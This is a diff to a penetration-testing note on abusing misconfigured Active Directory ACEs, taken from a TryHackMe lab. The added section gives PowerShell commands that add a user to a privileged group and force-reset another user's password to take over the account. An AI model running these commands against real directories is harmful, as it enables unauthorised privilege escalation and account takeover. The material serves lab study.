@@ -133,7 +133,20 @@ A significant amount of ACEs can be misconfigured, and the exploits for each var
 
 In order to exploit these ACEs, we will need a method to interact with AD to make these requests. The two best options for this are the AD-RSAT PowerShell cmdlets or PowerSploit.  
 Depending on the breach and the detection tools in the environment, one option may be stealthier.  
+
 Source: [Tryhackme](https://tryhackme.com/room/exploitingad)
+
+### Examples
+
+- `AddMembers` To exploit this we just need to add our user to the desired group using powershell `Add-ADGroupMember "IT Support" -Members "barbara.reid"`
+- Checked that it worked `Get-ADGroupMember -Identity "IT Support"`
+- `ForceChangePassword` Identify a member of the group we want to change the password for taking over their account `Get-ADGroupMember -Identity "Tier 2 Admins"`
+- And then we can change the password. *Note: It can take up to 10 minutes to be effective. We also might need to disconnect and reconnect*.
+
+```dos
+$Password = ConvertTo-SecureString "Newpassword1234!" -AsPlainText -Force 
+Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password 
+```
 
 ## Other Tips Bloodhound
 
